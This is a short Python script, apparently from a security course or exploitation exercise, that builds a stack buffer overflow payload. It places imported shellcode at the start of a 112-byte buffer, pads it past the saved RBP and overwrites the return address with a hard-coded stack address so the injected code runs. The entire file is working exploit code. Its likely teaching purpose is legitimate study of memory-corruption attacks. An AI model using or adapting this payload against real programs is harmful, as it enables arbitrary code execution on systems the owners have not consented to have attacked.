#!/usr/bin/env python3

import sys
from shellcode import shellcode

#need 120 bytes total to reach the return address buf is 112 bytes and 8 bytes for saved RBP

payload = shellcode

padding = 120 - len(shellcode)
payload += b"A" * padding #66 bytes of padding to reach return address

#Bytes 120-127: Overwrite return address with address of start of buffer
buf_address = 0x7ffffff411d0 
payload += buf_address.to_bytes(8, 'little') #8 bytes, littled endian

sys.stdout.buffer.write(payload) #show output based on the input payload